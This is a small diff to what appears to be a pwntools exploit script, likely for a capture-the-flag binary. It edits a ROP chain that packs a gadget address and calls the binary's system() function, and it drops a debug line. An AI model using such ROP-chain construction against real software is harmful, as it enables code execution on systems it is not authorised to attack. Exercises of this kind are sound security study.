@@ -15,10 +15,8 @@ elf = context.binary = ELF(executable)
 rop = ROP(elf)
 
 #rop.call(rop.find_gadget(['pop rdi', 'ret']))
-#rop.call(0x402107)
-rop.raw(0x402107)
+rop.raw(p64(0x402107))
 rop.call(elf.symbols["system"])
-info("%#x ROP", u64(rop.chain()))
 
 #####################################################
 # Create Payload
